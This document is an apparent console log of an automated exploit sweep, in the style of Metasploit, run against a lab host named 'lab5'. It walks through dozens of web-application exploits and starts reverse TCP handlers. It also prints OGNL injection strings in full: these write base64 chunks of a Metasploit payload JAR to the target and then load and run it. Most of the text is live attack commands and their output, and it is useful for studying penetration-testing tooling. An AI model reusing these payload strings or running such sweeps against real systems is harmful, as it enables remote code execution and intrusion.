[*] [2016.06.04-09:44:32] [0252] Attempting to execute: #f=new java.io.FileOutputStream('e0dJnh.jar',true),#f.write(new sun.misc.BASE64Decoder().decodeBuffer('UzYYKStF0Zn0WPGRhAhLC2A4SJxL/5+GcqLZp42fNaUccyM7oUwebJu0PYCWmsihNhvJfrOtmyGaCiIusvPt8/9zuF+4Yja0kTZTjmfZsvCURjfg2oyyruKmLLszcUALky9MC0/+onBznZUm5JXhg/1k4Fd5ylvTn3ISHIEKx0BuE5oQjtljdnNKcjGEcMEPp7wjUmDMpI+iCaSyh+T0RGpCOZ0ZPlBcMWhjOm2lc6BlE9K3yUHnt5OmSd9SYvg0Fk71Iqgt1TiYcCYwsNyykqbB3XdHVzt9HE6b8hFHyY4Iev0XwifCH//F5b3JlzttdifJ+rUeBlZYx5q1RKm8eQoXy3J1ssBD8oxEajN1CQgnFIiudQcZXtKAkXDcVouSCTl/aZ9X3KgadaTdrJrfGW+xHZMULHAFDx3AHD6LI378Nq9asu7s/g12NqXKpEfu3GxO3YU+4paT4cLrlrPFSijaUuMNIMLsnD9MaQ5Zqm4r7RWNI/9Hxs/ZVGH8OQcq')),#f.close()
[*] [2016.06.04-09:44:32] [0252] Attempting to execute: #f=new java.io.FileOutputStream('e0dJnh.jar',true),#f.write(new sun.misc.BASE64Decoder().decodeBuffer('xE2T+9tA2J0CRozrE9ksnwmvjVzmJeSJTd+sPOedEHuFP18LR2RRjAqm4zaGNn8xm4Pehlt1z8lZV2RDv/trBGmB9k0uwz76YKcCnCVVoKtzCSwOT9BozocO2H65j+onIx1v5ZYdkFyDlUxmjcU4JObfzclBXq3sTyYprxbFze5EymzwvuaaCgUaidf88Z1mQWOraSrkyc051NOn/lLj6jtlDjSlKOumYlO6j/HG/QBJlRHkVfr8IHA9yBxM2A7RFvv67R4Oi1xrRUWhx7BbKGPnLB0wL+g3kvakpJ8Lakr6ou3+buLrs/rcD88spoYeg7BhAzXs4YZCXQ53ixySlAt7qQTVO1Mq3n4xq/5HCzAJpZRIxc1BLqEcMU0cUU0HKKWOxXy6H28MvWgd8Tu3ML+5riyQNFMbuQoGYvzU8ag0cAA0udTKxvvqZotaEY6FxtZTm5uiq/b/YJh367HRbA2Y6QbDzmt48mEKcA+HgQiPAIAfZnObTKvZ3Bi7M30N')),#f.close()
[+] [2016.06.04-09:44:32] Workspace:lab5 Progress:258/775 (33%) [254/770] 10.198.0.1:80 - appRain CMF Arbitrary PHP File Upload Vulnerability
[*] [2016.06.04-09:44:32] [0252] Attempting to execute: #f=new java.io.FileOutputStream('e0dJnh.jar',true),#f.write(new sun.misc.BASE64Decoder().decodeBuffer('uPOT2fkp91wB5N+eaPw57abRjPy+YgRwt/v7dxB+Ab8Ega/FLRAgEBDPGQOhawR8zeUgtoyBn9aBqgxIZTVltRmQMxDUFBoyUNRapakZKI6IurgHSip1MQMlPJRWamUZmBbx6/49cJ6maeWjMD0S0AMZCHWOwYyuLFY+mMn4Znn4RkCPSLqUgdkulC7p/hGYE5GrdL8uj8JcF+28zkrtEJ3YODQD82l9mLYgA4ePwhF1AbpgslIocAOeSzehgBgfhSMzsLAzx4TMLycyIU9lIuiSD2pHMXnF21TzukgvykA4A4s6q6r1IpelCq2S6GukoeptMLNKq3HBGUyrpScuzNFIIHv49pjx28Xe7Rgc26UrI7AkolbqKiM7Tiet1o3C8dK9sLTLp50wCpFol6gti3b5dWJxZrTLNUg0AydGivXiDJxEOuf5ZJqnwymjUE9PZ3T59CJ651Ljpwq904PRSImvrjRUqpfctwOO89WVhcrKlB1wpF4SKl1MutkGgSGY')),#f.close()
[*] [2016.06.04-09:44:32] [0254] Started reverse TCP handler on 0.0.0.0:1171
[*] [2016.06.04-09:44:32] [0254] Sending PHP payload (XdtMhAuhSul.php)
[*] [2016.06.04-09:44:32] [0252] Attempting to execute: #f=new java.io.FileOutputStream('e0dJnh.jar',true),#f.write(new sun.misc.BASE64Decoder().decodeBuffer('md0tnw4NhG1rGQ7te3FrKY2PDgkn69IeuNqzEGtLHobG62B1OczQVor3wqldvmFYRcw16TJtT+Pt6bRt7hyCBZEgyRXw5GplodqYM1eUDLQThBIJsoxrCEx0wbzLTpeG5lmPxzAvhnC4UotqHVkHkCu1tazpSJDM4i6UkLwdyobhjEjRMHRG1CF4QFf2wGW6op3pGmz2GHSR+snnztLWZeDsETgnUjQEawnAs+hJY3Cua5/1GTgvUqwZo7BBi3lilkOcxURPSr3YFZLtYDKOaXkvuyNFY7CR3K2HeThJD+6B8jFIkFuF5BE4P1I8xJxs6uJdMlKil2Sgl0xLU4rxWeR4NPWRi3i+xGbfAx3aBcxNOpDlxiaFloNDGi2HpS5nAY8z1w1U1rTL4/3QT/+YjG/x/WAT8hKRFk5EHYPNubjQBigeKrVB17290NC2jMCFHncXkW0ipa736KXkSOV6Ka3o4uKo6yxvj4FIWD6pF+nE8yXMs146Ap/aDYJwvNAl')),#f.close()
[-] [2016.06.04-09:44:32] [0254] File wasn't uploaded, aborting!
[*] [2016.06.04-09:44:32] [0252] Attempting to execute: #f=new java.io.FileOutputStream('e0dJnh.jar',true),#f.write(new sun.misc.BASE64Decoder().decodeBuffer('nA0tNF8kXAKrKQ09S/9Fyk2rKWM9B897CQnW0plEc1NFjqVLmSWPF8o7rRw6VRw54rQyuEeO+Kt1fwY+3VUXEG6EMl3U/b4QpZjLhva9xWmpzst5TCxAJH4FL4DGv1Vlyb1PxIpofmUMLu+qHIGtEf8YXEF0r+SkNAZX0fIzGfjsGFxNOrqmi82rfY7M67sXPj8CX+Bg+GJErn4YTmA2vlQXDAWJKYWSF+XLL1dUoK74QkF23q90RYivr+4H277v+SGYk5PyayRhtSclmdfLm1+nsAho38hZ+vI8S3/TDbVg1tR+uqliS4vZkNM4DY/BNtbUdRn41m63BjxOFeLaSZp/CV7OVoqzSCUCza3YPAzXb4N5WdaGYTtnyhs85ipG4cbmyocn396Uf7sHZDLYzF20+/YuV/0K/zqVpVNJVJibQ7MYKugpBfo2kLUdQ+DXsrbOPXwFXs0+XExMizQvJLzfacFWitWd20DnnFRVSaQotbaSCndeB35src69fw1e')),#f.close()
[*] [2016.06.04-09:44:33] [0252] Attempting to execute: #f=new java.io.FileOutputStream('e0dJnh.jar',true),#f.write(new sun.misc.BASE64Decoder().decodeBuffer('z76/i14HaL5tDG4mwrc0E56hlsoqH+W8Wzs5CqrExcPwXfJ3xvO9bdBA08URUfs+e9IPOEnue0u7LbuZS4z+0L8DVGaAqqu+iw5u52zmFsVbO4f23TMGu4jS7ojoq/OH/PxgBxwR8os7QdXFYRjOwB2dulgZIp+4MwM/6tzqpzB6wc2yhCLDSLNivAFvemJgkMSQ6exDen9iRVntHKrPZWfzeDq2VJRFMjBy8rwb4EpXp5fOE8+rEyt8IUI32kKqvosdPFfeg/TqbtJ1i+4PiUvm3ARKSBTPIyOExDoxx3uANlKIyjJFfJgAJQYs4YUYXzLnRloG3FOWZatE/D/Hvps5fQhWE70xkvWUCqJ+D72qq5hDkt5LDM1hQu4yJPp3QilzyAejQyBWtFQQb2OUnQlHMRmkhd+fdbrfLQ3k52JF1FOLDL/d3+jUu84LcJx23yj8eBjuz8ADd8CD2kO0uwN+ov10GB4ku90B1w/Tbo+7bNQedm+3e0kC/gtQSwME')),#f.close()
[+] [2016.06.04-09:44:33] Workspace:lab5 Progress:259/775 (33%) [255/770] 10.198.0.1:80 - Gitorious Arbitrary Command Execution
[-] [2016.06.04-09:44:33] No reverse connect payloads available for exploit/multi/http/gitorious_graph
[-] [2016.06.04-09:44:33] No payloads were compatible with exploit/multi/http/gitorious_graph)
[-] [2016.06.04-09:44:33] [0255] Exploit failed: A payload has not been selected.
[*] [2016.06.04-09:44:33] [0252] Attempting to execute: #f=new java.io.FileOutputStream('e0dJnh.jar',true),#f.write(new sun.misc.BASE64Decoder().decodeBuffer('FAAAAAAAn03ESAAAAAAAAAAAAAAAAAkAAABNRVRBLUlORi9QSwMEFAAAAAgAn03ESH6aFUZiAAAAkQAAABQAAABNRVRBLUlORi9NQU5JRkVTVC5NRvNNzMtMSy0u0Q1LLSrOzM+zUjDUM+Dl8k3MzNN1zkksLrZSyE0tSSwuyMnPLNELSKzMyU9M4eUKSC3KzSwGaQAqSMzJ0S1ACPBy8XL5JeamouhMSSzBJq4PNVEvGWQXSAUAUEsBAhQAFAAAAAgAn03ESGhAzyYjAAAAJAAAAA4AAAAAAAAAAAAAAAAAAAAAAG1ldGFzcGxvaXQuZGF0UEsBAhQAFAAAAAAAn03ESAAAAAAAAAAAAAAAAAsAAAAAAAAAAAAAAAAATwAAAG1ldGFzcGxvaXQvUEsBAhQAFAAAAAgAn03ESHB7Ld9OEQAAQSEAABgAAAAAAAAAAAAAAAAAeAAAAG1ldGFzcGxvaXQvUGF5bG9hZC5jbGFzc1BLAQIUABQAAAAAAJ9N')),#f.close()
[+] [2016.06.04-09:44:34] Workspace:lab5 Progress:260/775 (33%) [256/770] 10.198.0.1:80 - vBSEO proc_deutf() Remote PHP Code Injection
[*] [2016.06.04-09:44:34] [0252] Attempting to execute: #f=new java.io.FileOutputStream('e0dJnh.jar',true),#f.write(new sun.misc.BASE64Decoder().decodeBuffer('xEgAAAAAAAAAAAAAAAAJAAAAAAAAAAAAAAAAAPwRAABNRVRBLUlORi9QSwECFAAUAAAACACfTcRIfpoVRmIAAACRAAAAFAAAAAAAAAAAAAAAAAAjEgAATUVUQS1JTkYvTUFOSUZFU1QuTUZQSwUGAAAAAAUABQA0AQAAtxIAAAAA')),#f.close()
[*] [2016.06.04-09:44:34] [0256] Started reverse TCP handler on 0.0.0.0:1172
[*] [2016.06.04-09:44:34] [0252] Attempting to execute: #q=@java.lang.Class@forName('ognl.OgnlRuntime').getDeclaredField('_jdkChecked'),#q.setAccessible(true),#q.set(null,true),#q=@java.lang.Class@forName('ognl.OgnlRuntime').getDeclaredField('_jdk15'),#q.setAccessible(true),#q.set(null,false),#cl=new java.net.URLClassLoader(new java.net.URL[]{new java.io.File('e0dJnh.jar').toURI().toURL()}),#c=#cl.loadClass('metasploit.Payload'),#c.getMethod('main',new java.lang.Class[]{@java.lang.Class@forName('[Ljava.lang.String;')}).invoke(null,new java.lang.Object[]{new java.lang.String[0]})
[*] [2016.06.04-09:44:34] [0256] Server replied with 302
[+] [2016.06.04-09:44:35] Workspace:lab5 Progress:261/775 (33%) [257/770] 10.198.0.1:8080 - Wordpress Download Manager (download-manager) Unauthenticated File Upload
[*] [2016.06.04-09:44:35] [0257] Started reverse TCP handler on 0.0.0.0:1173
[*] [2016.06.04-09:44:35] [0257] Uploading payload
[-] [2016.06.04-09:44:35] [0257] Exploit aborted due to failure: unknown: 10.198.0.1:8080 - Error on uploading file
[+] [2016.06.04-09:44:36] Workspace:lab5 Progress:262/775 (33%) [258/770] 10.198.0.1:8080 - PHP Utility Belt Remote Code Execution
[*] [2016.06.04-09:44:36] [0258] Started reverse TCP handler on 0.0.0.0:1174
[+] [2016.06.04-09:44:37] Workspace:lab5 Progress:263/775 (33%) [259/770] 10.198.0.1:8080 - Nibbleblog File Upload Vulnerability
[+] [2016.06.04-09:44:37] Workspace:lab5 Progress:264/775 (34%) [260/770] 10.198.0.1:8080 - Pandora FMS v3.1 Auth Bypass and Arbitrary File Upload Vulnerability
[*] [2016.06.04-09:44:37] [0260] Started reverse TCP handler on 0.0.0.0:1176
[*] [2016.06.04-09:44:38] [0260] Uploading PHP payload (946 bytes)
[-] [2016.06.04-09:44:38] [0260] Exploit aborted due to failure: unexpected-reply: 10.198.0.1:8080 - Uploading PHP payload failed
[!] [2016.06.04-09:44:38] [0260] This exploit may require manual cleanup of '9106371.php' on the target
[+] [2016.06.04-09:44:38] Workspace:lab5 Progress:265/775 (34%) [261/770] 10.198.0.1:80 - LANDesk Lenovo ThinkManagement Console Remote Command Execution
[*] [2016.06.04-09:44:38] Increasing WfsDelay to 5 minutes for Dynamic Stagers
[*] [2016.06.04-09:44:38] [0261] Started reverse TCP handler on 0.0.0.0:1177
[+] [2016.06.04-09:44:39] Workspace:lab5 Progress:266/775 (34%) [262/770] 10.198.0.1:8080 - TWiki Search Function Arbitrary Command Execution
[*] [2016.06.04-09:44:39] [0261] Uploading 107814 bytes through /landesk/managementsuite/core/core.anonymous/ServerSetup.asmx...
[-] [2016.06.04-09:44:39] No reverse connect payloads available for exploit/unix/webapp/twiki_search
[-] [2016.06.04-09:44:39] No payloads were compatible with exploit/unix/webapp/twiki_search)
[-] [2016.06.04-09:44:39] [0262] Exploit failed: A payload has not been selected.
[+] [2016.06.04-09:44:40] Workspace:lab5 Progress:267/775 (34%) [263/770] 10.198.0.1:80 - Dolibarr ERP/CRM Post-Auth OS Command Injection
[-] [2016.06.04-09:44:40] No reverse connect payloads available for exploit/linux/http/dolibarr_cmd_exec
[-] [2016.06.04-09:44:40] No payloads were compatible with exploit/linux/http/dolibarr_cmd_exec)
[-] [2016.06.04-09:44:40] [0263] Exploit failed: A payload has not been selected.
[*] [2016.06.04-09:44:40] [0261] Executing /ldlogon/bJTBCUzOY.asp...
[*] [2016.06.04-09:44:40] [0261] Deleting /ldlogon/bJTBCUzOY.asp through /WSVulnerabilityCore/VulCore.asmx...
[+] [2016.06.04-09:44:40] Workspace:lab5 Progress:268/775 (34%) [264/770] 10.198.0.1:80 - WebCalendar 1.2.4 Pre-Auth Remote Code Injection
[-] [2016.06.04-09:44:40] No reverse connect payloads available for exploit/linux/http/webcalendar_settings_exec
[-] [2016.06.04-09:44:40] No payloads were compatible with exploit/linux/http/webcalendar_settings_exec)
[-] [2016.06.04-09:44:40] [0264] Exploit failed: A payload has not been selected.
[+] [2016.06.04-09:44:40] Workspace:lab5 Progress:269/775 (34%) [265/770] 10.198.0.1:80 - PHP CGI Argument Injection
[*] [2016.06.04-09:44:41] [0265] Started reverse TCP handler on 0.0.0.0:1178
[+] [2016.06.04-09:44:41] Workspace:lab5 Progress:270/775 (34%) [266/770] 10.198.0.1:8080 - WordPress Admin Shell Upload
[+] [2016.06.04-09:44:41] Workspace:lab5 Progress:271/775 (34%) [267/770] 10.198.0.1:8080 - Openfire Admin Console Authentication Bypass
[*] [2016.06.04-09:44:41] Increasing WfsDelay to 5 minutes for Dynamic Stagers
[-] [2016.06.04-09:44:42] [0267] Exploit aborted due to failure: not-found: The target server fingerprint "Apache-Coyote/1.1" does not match "(?-mix:(Jetty))", use 'set FingerprintCheck false' to disable this check.
[+] [2016.06.04-09:44:42] Workspace:lab5 Progress:272/775 (35%) [268/770] 10.198.0.1:8080 - CA Total Defense Suite reGenerateReports Stored Procedure SQL Injection
[*] [2016.06.04-09:44:42] Increasing WfsDelay to 5 minutes for Dynamic Stagers
[*] [2016.06.04-09:44:42] [0268] Started reverse TCP handler on 0.0.0.0:1181
[*] [2016.06.04-09:44:42] [0268] Sending request to 10.198.0.1:8080
[-] [2016.06.04-09:44:43] [0268] Exploit failed [unreachable]: OpenSSL::SSL::SSLError SSL_connect returned=1 errno=0 state=SSLv2/v3 read server hello A: unknown protocol
[+] [2016.06.04-09:44:44] Workspace:lab5 Progress:273/775 (35%) [269/770] 10.198.0.1:80 - Active Collab "chat module" Remote PHP Code Injection Exploit
[+] [2016.06.04-09:44:44] Workspace:lab5 Progress:274/775 (35%) [270/770] 10.198.0.1:8080 - Novell ZENworks Asset Management Remote Execution
[*] [2016.06.04-09:44:44] [0270] Started reverse TCP handler on 0.0.0.0:1183
[*] [2016.06.04-09:44:44] [0270] Uploading 6070 bytes as YTdc3R16.war ...
[+] [2016.06.04-09:44:45] Workspace:lab5 Progress:275/775 (35%) [271/770] 10.198.0.1:8080 - LifeSize Room Command Injection
[-] [2016.06.04-09:44:45] No reverse connect payloads available for exploit/unix/http/lifesize_room
[-] [2016.06.04-09:44:45] No payloads were compatible with exploit/unix/http/lifesize_room)
[-] [2016.06.04-09:44:45] [0271] Exploit failed: A payload has not been selected.
[+] [2016.06.04-09:44:45] Workspace:lab5 Progress:276/775 (35%) [272/770] 10.198.0.1:80 - PHP Volunteer Management System v1.0.2 Arbitrary File Upload Vulnerability
[*] [2016.06.04-09:44:46] [0272] Started reverse TCP handler on 0.0.0.0:1184
[-] [2016.06.04-09:44:46] [0272] Login failed with "admin:volunteer"
[+] [2016.06.04-09:44:48] Workspace:lab5 Progress:277/775 (35%) [273/770] 10.198.0.1:80 - WordPress Asset-Manager PHP File Upload Vulnerability
[*] [2016.06.04-09:44:49] [0273] Started reverse TCP handler on 0.0.0.0:1185
[*] [2016.06.04-09:44:49] [0273] Uploading payload XenOw.php
[-] [2016.06.04-09:44:49] [0273] Exploit aborted due to failure: unexpected-reply: 10.198.0.1:80 - Upload failed
[+] [2016.06.04-09:44:49] Workspace:lab5 Progress:278/775 (35%) [274/770] 10.198.0.1:8080 - CA Arcserve D2D GWT RPC Credential Information Disclosure
[*] [2016.06.04-09:44:49] [0274] Started reverse TCP handler on 0.0.0.0:1186
[*] [2016.06.04-09:44:49] [0274] Sending request to 10.198.0.1:8080
[-] [2016.06.04-09:44:50] [0274] Exploit aborted due to failure: not-found: The server did not return credentials
[+] [2016.06.04-09:44:50] Workspace:lab5 Progress:279/775 (36%) [275/770] 10.198.0.1:8080 - Plone and Zope XMLTools Remote Command Execution
[-] [2016.06.04-09:44:50] No reverse connect payloads available for exploit/multi/http/plone_popen2
[-] [2016.06.04-09:44:50] No payloads were compatible with exploit/multi/http/plone_popen2)
[-] [2016.06.04-09:44:50] [0275] Exploit failed: A payload has not been selected.
[+] [2016.06.04-09:44:50] Workspace:lab5 Progress:280/775 (36%) [276/770] 10.198.0.1:80 - WordPress WP-Property PHP File Upload Vulnerability
[*] [2016.06.04-09:44:50] [0276] Started reverse TCP handler on 0.0.0.0:1187
[*] [2016.06.04-09:44:51] [0276] Uploading payload guhAJ.php
[-] [2016.06.04-09:44:51] [0276] Exploit aborted due to failure: unexpected-reply: 10.198.0.1:80 - Upload failed
[+] [2016.06.04-09:44:51] Workspace:lab5 Progress:281/775 (36%) [277/770] 10.198.0.1:80 - qdPM v7 Arbitrary PHP File Upload Vulnerability
[+] [2016.06.04-09:44:52] Workspace:lab5 Progress:282/775 (36%) [278/770] 10.198.0.1:80 - Linksys Devices pingstr Remote Command Injection
[-] [2016.06.04-09:44:52] No reverse connect payloads available for exploit/linux/http/linksys_wrt110_cmd_exec
[-] [2016.06.04-09:44:52] No payloads were compatible with exploit/linux/http/linksys_wrt110_cmd_exec)
[-] [2016.06.04-09:44:52] [0278] Exploit failed: A payload has not been selected.
[+] [2016.06.04-09:44:52] Workspace:lab5 Progress:283/775 (36%) [279/770] 10.198.0.1:80 - vTigerCRM v5.4.0/v5.3.0 Authenticated Remote Code Execution
[*] [2016.06.04-09:44:52] [0279] Started reverse TCP handler on 0.0.0.0:1189
[-] [2016.06.04-09:44:55] [0270] WAR upload failed...
[+] [2016.06.04-09:44:55] Workspace:lab5 Progress:284/775 (36%) [280/770] 10.198.0.1:8080 - Support Incident Tracker Remote Command Execution
[+] [2016.06.04-09:44:56] Workspace:lab5 Progress:285/775 (36%) [281/770] 10.198.0.1:8080 - Apache Struts ParametersInterceptor Remote Code Execution
[*] [2016.06.04-09:44:56] Increasing WfsDelay to 5 minutes for Dynamic Stagers
[*] [2016.06.04-09:44:56] [0281] Started reverse TCP handler on 0.0.0.0:1191
[-] [2016.06.04-09:44:56] [0281] Exploit failed: Msf::NoCompatiblePayloadError Failed to generate an executable payload due to an invalid platform or arch.
[+] [2016.06.04-09:44:56] Workspace:lab5 Progress:286/775 (36%) [282/770] 10.198.0.1:80 - Zabbix Authenticated Remote Command Execution
[-] [2016.06.04-09:44:56] No reverse connect payloads available for exploit/multi/http/zabbix_script_exec
[-] [2016.06.04-09:44:56] No payloads were compatible with exploit/multi/http/zabbix_script_exec)
[-] [2016.06.04-09:44:56] [0282] Exploit failed: A payload has not been selected.
[+] [2016.06.04-09:44:57] Workspace:lab5 Progress:287/775 (37%) [283/770] 10.198.0.1:80 - ISPConfig Authenticated Arbitrary PHP Code Execution
[*] [2016.06.04-09:44:57] [0283] Started reverse TCP handler on 0.0.0.0:1192
[-] [2016.06.04-09:44:57] [0283] Exploit aborted due to failure: unexpected-reply: Error getting initial page.
[+] [2016.06.04-09:44:58] Workspace:lab5 Progress:288/775 (37%) [284/770] 10.198.0.1:8080 - phpLDAPadmin query_engine Remote PHP Code Injection
[*] [2016.06.04-09:44:58] [0284] Started reverse TCP handler on 0.0.0.0:1193
[-] [2016.06.04-09:44:58] [0284] Could not generate a valid session
[+] [2016.06.04-09:44:58] Workspace:lab5 Progress:289/775 (37%) [285/770] 10.198.0.1:80 - OpenMediaVault Cron Remote Command Execution
[-] [2016.06.04-09:44:58] No reverse connect payloads available for exploit/multi/http/openmediavault_cmd_exec
[-] [2016.06.04-09:44:58] No payloads were compatible with exploit/multi/http/openmediavault_cmd_exec)
[-] [2016.06.04-09:44:58] [0285] 10.198.0.1:80 - Exploit failed: A payload has not been selected.
[+] [2016.06.04-09:44:59] Workspace:lab5 Progress:290/775 (37%) [286/770] 10.198.0.1:8080 - HP Managed Printing Administration jobAcct Remote Command Execution
[*] [2016.06.04-09:44:59] Increasing WfsDelay to 5 minutes for Dynamic Stagers
[*] [2016.06.04-09:44:59] [0286] Started reverse TCP handler on 0.0.0.0:1194
[*] [2016.06.04-09:45:00] [0286] Uploading 14228 bytes to /hpmpa/userfiles/images/printers/...
[-] [2016.06.04-09:45:00] [0286] Unknown error while while writing to /hpmpa/userfiles/images/printers/
[*] [2016.06.04-09:45:00] [0286] Uploading 14228 bytes to /hpmpa/userfiles/images/backgrounds/...
[-] [2016.06.04-09:45:00] [0286] Unknown error while while writing to /hpmpa/userfiles/images/backgrounds/
[*] [2016.06.04-09:45:00] [0286] Uploading 14228 bytes to /hpmpa/userfiles/images/...
[-] [2016.06.04-09:45:00] [0286] Unknown error while while writing to /hpmpa/userfiles/images/
[*] [2016.06.04-09:45:00] [0286] Uploading 14228 bytes to /hpmpa/userfiles/...
[-] [2016.06.04-09:45:00] [0286] Unknown error while while writing to /hpmpa/userfiles/
[*] [2016.06.04-09:45:00] [0286] Uploading 14228 bytes to /...
[-] [2016.06.04-09:45:00] [0286] Unknown error while while writing to /
[-] [2016.06.04-09:45:00] [0286] Exploit aborted due to failure: not-vulnerable: 10.198.0.1:8080 - Failed to upload ASP payload to the target
[+] [2016.06.04-09:45:01] Workspace:lab5 Progress:291/775 (37%) [287/770] 10.198.0.1:8080 - WikkaWiki 1.3.2 Spam Logging PHP Injection
[+] [2016.06.04-09:45:01] Workspace:lab5 Progress:292/775 (37%) [288/770] 10.198.0.1:8080 - PmWiki pagelist.php Remote PHP Code Injection Exploit
[*] [2016.06.04-09:45:01] [0288] Started reverse TCP handler on 0.0.0.0:1196
[+] [2016.06.04-09:45:02] Workspace:lab5 Progress:293/775 (37%) [289/770] 10.198.0.1:8080 - Hastymail 2.1.1 RC1 Command Injection
[-] [2016.06.04-09:45:02] No reverse connect payloads available for exploit/unix/webapp/hastymail_exec
[-] [2016.06.04-09:45:02] No payloads were compatible with exploit/unix/webapp/hastymail_exec)
[+] [2016.06.04-09:45:02] Workspace:lab5 Progress:294/775 (37%) [290/770] 10.198.0.1:80 - Apache Roller OGNL Injection
[*] [2016.06.04-09:45:02] [0290] Started reverse TCP handler on 0.0.0.0:1197
[*] [2016.06.04-09:45:02] [0290] Checking injection...
[!] [2016.06.04-09:45:02] [0290] Target not found as vulnerable, trying anyway...
[*] [2016.06.04-09:45:02] [0290] Attempting to execute: #f=new java.io.FileOutputStream('Rslm5e0.jar'+#a,false),#f.write(new sun.misc.BASE64Decoder().decodeBuffer('UEsDBBQAAAAIAKJNxEjbKhCzIwAAACQAAAAOAAAAbWV0YXNwbG9pdC5kYXQLLkgsz7M14vLx8A8OsTU00DO0tNAz0AMKBPgHAQUMLc25AFBLAwQUAAAAAACiTcRIAAAAAAAAAAAAAAAACwAAAG1ldGFzcGxvaXQvUEsDBBQAAAAIAKJNxEhwey3fThEAAEEhAAAYAAAAbWV0YXNwbG9pdC9QYXlsb2FkLmNsYXNzlRgJeBTl9b3Z2Z3ZyeRgwgLDoYiKS05FjLh4NIQg0VywwRhRcdidkJXNTtyZkKDWWkVttfcpVtRSNPawQrSbaNR6tHjUs61ardaztNbWWrV3lb43s0s2yWJpPvjP97/7mn3so7vvA4BjhBoFHoG9EvxOAYHn30vwlgJ+2KvAqfAHBZbC27z9owx/4vkdGf7MN+8y+F8UsOE9Gd7nzQcy/FWGvykwA/7Owz8k+CfP/5Lh3zz/h4cPefhIARH20RsEGZFOUOCNT0ZRRj8vAwpKKBNx')),#f.close(),#a='CBf'
[*] [2016.06.04-09:45:03] [0290] Attempting to execute: #f=new java.io.FileOutputStream('Rslm5e0.jar'+#a,true),#f.write(new sun.misc.BASE64Decoder().decodeBuffer('DPJWkbGIwVQeimUskbFUxjK+nyajJmO5jNNlDMk4Q8KZChyLs/iZTit4T8HZOEfCuTLOI7p4iIyH8tF8BQ/DBTwc7gf3T3pawSPwSKaxMHsE8SA9OUrGsISLgliBlSQ7VklYzZsaBWvxaAmPkXGxjMcyriUSHqfAaqyT8XgZl8p4QhAjuIyHE2U8ScKTmelTZPwEz/UKdOFyCRsUOJf1cy6ukLGRSayU8VQJVykQJx7pvEnC0xTYSAbC0xVIYLOELQpswlYe2mggOel4AQ/tMq6WcY2EUQk7JFwr4Rkydsp4poxdCmzGs3hYx8PZbIi9Mp7DijlXxvVkTzyP9WdIuEGByzEmYVyBK5iuqcBV7BVXYLeEGyXskTEh4fkKXIObFLgakwzfy0OK0Vk89Ml4AYuTltGW0JGwX8LNCmzDAQWuxUFW7hYeLpTxIoa/WMZP8nyJjJ/i+VI2xqclvEyBm5m2iJfTCrcG6fgKluBKGa9iTX5Gxs/yzdU8XCPh5xTY')),#f.close(),#a='CBf'
[*] [2016.06.04-09:45:03] [0290] Attempting to execute: #f=new java.io.FileOutputStream('Rslm5e0.jar'+#a,true),#f.write(new sun.misc.BASE64Decoder().decodeBuffer('BXsZ7PO0wi/w8Rd59SW+eIeffJmHr/DwVXJs/Bqvvs7DN3j4pozXKhiBD4K4Da/jk28xo9fLuJ3nG2S8UcabZPy2hDsQpLbo+tb6lkYErfl8Y7NRmzRSG2ujTjqR2riMvLy9vmPV+mhjO0KgKbq+vulMBDzL26xoiyIET6s/o379qjbGEDgxkUo4JyP4wovOQBAbrLhJU6+RSCHMCK+bSoDBlMbBmNnnJKyUjTBtIJ1wzMbeDWY8bsZXJpKEYEk472FD0rDtZVMxeScJq5bfEF4JvyPhTuJvg2U5tpM2+hCi4f1QTam+foeemkbv+NO2fmfyaT6JA/BfttF0TkubjYNmrN8xNjDHC8MFQAupVzXi8cZBx0zZJD4x251IxZtSKxLpSVJPELIA1pzchCJlpXuNZOJCYmNB+CAeSPGEbZsxB+GoQuDrCnrFibGka2oVnoZnEKa7MP1OIlnbnrb6zLSTMMmYWq/pGHZf0ko4te3GlqRlxBFmTsa3vD+RjJtp')),#f.close(),#a='CBf'
[*] [2016.06.04-09:45:03] [0290] Attempting to execute: #f=new java.io.FileOutputStream('Rslm5e0.jar'+#a,true),#f.write(new sun.misc.BASE64Decoder().decodeBuffer('FW/GW1QcwltV/C5+j7ypJsa2VvH7eAtCae04spq44aj4A7xNxR/i7SruYh6UcQOouBteJgSX2H3GAKlVrHF6+1QchldVvAPvJLXn60DFHzEBsSaeSJM8mFFxBO/k1agKz8HzKt6Fd5NnriDJ+sx4Ppkx5vgevBfBH/VI4dFEHO+T8Mcq3o8PqPggPqTiT/CnCCWTBdiDD6v4CPPjW7umGQGI5R7H6bMjKj6KjyEcMVV/Hel+22kxUsZGM+3pB0H/mLui+sZoO60GrDTp/pA8hHTRmIqlt7iRlwMvL3g6K19d+UHCSvqZio/jExI+qeJT+DSFw2T7kmr5SIWX2ChKtYu0z3B6VHwGfy7hL1T8JT6r4nP4rISk7V/hCyq+CM+o8CQ8gVBsm05+bJVOygUS/lrFl/BlFX+Dr0wg37bhfPJrFV/F1yR8XcU38E2EQ8fvW61of6ynxXR6rPj+HESmjPX0WqQsoXJQxd/iXtLK+Jv9cCr+jr3O39zetqaDRFxC')),#f.close(),#a='CBf'
[*] [2016.06.04-09:45:03] [0290] Attempting to execute: #f=new java.io.FileOutputStream('Rslm5e0.jar'+#a,true),#f.write(new sun.misc.BASE64Decoder().decodeBuffer('f7xd1RalyvV7Fd/CP6j4Nv6R7tLGQARhbk6Ly7c4Zn06bWzJS0Iq/gkfIu00Rduqly497oTqY1R8B//MCn43568p06klR1HxL/jeBFvWFHAAFd/HD8ih+m1zpUXpZEY+igYrlSLVuGL8FZ9FmDeFt3wz55TOr6NWbJPpMF9/QwiNH5vpzWZ6/PLvKv4D/6niv/Df5D95rE5wMPLPAcrMHhU7p+iJ6TmXXSblZwLOT02erSk16eOpyHO/DmuTmaJ0SDooyuppfnX1fJIp6pCi2o20QeyZaSKP85n1/6j4Ie5V8SPOCsW5UuQCq/Ai/JrgalXcJ4AqoCDkEhqxt8JwjHyTEq7bcwxRhu2nyraltt1M91LC9ardnIl39cnk+LUq+ASRzDzpedpyPMutsLy6OmsiANfcqNWfjlGoyN0Ur5Ha2topaGKUomsbOE93J2KGQ4I9Lfh5CKiCRMILMr6rCkFBUYUiQaVMzs/7PO3V2KyKGlUoFkrI42mXdiZZY3+h')),#f.close(),#a='CBf'
